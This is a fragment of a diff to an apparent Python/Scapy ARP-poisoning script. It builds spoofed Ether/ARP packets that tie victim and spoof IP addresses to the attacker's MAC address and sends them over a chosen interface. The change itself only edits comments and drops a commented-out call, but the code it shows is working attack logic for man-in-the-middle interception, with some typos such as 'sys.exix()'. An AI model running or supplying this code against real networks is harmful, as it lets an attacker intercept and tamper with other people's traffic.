@@ -19,10 +19,10 @@ def arpPoisoning(victimIP, spoofIP, networkInterface):
             print("Error occure! Attcker Mac : " +attackerMAC +"Victim Mac: " +victimMAC + "spoofing MAC :" +spoofMAC)
             sys.exix()
 
-        # create Eher/ARP() packets for each victim IP victim
+        # create Eher/ARP() packets for each victim IP
         # whcih will update arp tabels with spoof IP and correspoding to them attacker MAC
-        #for each spoof IP create Ether/ARP() packet
-        #which will update  arp tables with victim IP and map to each ip attackerMAC
+        # for each spoof IP create Ether/ARP() packet
+        # which will update  arp tables with victim IP and map to each ip attackerMAC
         for i in range(0,len(victimIP)):
             for j in range(0,len(spoofIP)):
                 if victimIP[i]!= spoofIP[j]:
@@ -43,6 +43,3 @@ def arpPoisoning(victimIP, spoofIP, networkInterface):
                     pktS[ARP].pdst = spoofIP[j]
 
                     sendp(pktS, iface=networkInterface, verbose = 0)
-
-                    
-#arpPoisoning([victimIP], [spoofIP], networkInterface)
